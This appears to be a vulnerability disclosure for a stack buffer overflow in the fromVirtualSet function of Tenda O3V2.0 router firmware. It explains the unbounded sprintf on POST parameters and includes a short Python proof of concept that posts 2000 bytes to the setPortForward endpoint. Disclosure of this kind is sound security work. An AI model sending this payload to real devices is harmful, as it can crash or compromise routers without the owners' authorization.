## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2832.html

## Affected version

O3V2.0 V1.0.0.10(2478)

## Vulnerability details

In the O3V2.0 V1.0.0.10(2478) firmware has a stack overflow vulnerability in the `fromVirtualSet` function. The `v16, v17, v18, v20` variable receives the `ip, localPort, publicPort, app` parameters from a POST request. However, since the user can control the input of these parameters, the statement `sprintf((char *)v21, "0;%s;%s;%s;%s;%s;%s", v18, v17, v16, (const char *)v30, "1", v20);` can cause a buffer overflow. The user-provided  `ip, localPort, publicPort, app` can exceed the capacity of the `v21` array, triggering this security vulnerability.

![image-20240714215518639](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240714215518639.png)

![image-20240714215456841](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240714215456841.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/setPortForward"
payload = b"a"*2000

data = {"ip": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240714213455164](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240714213455164.png)
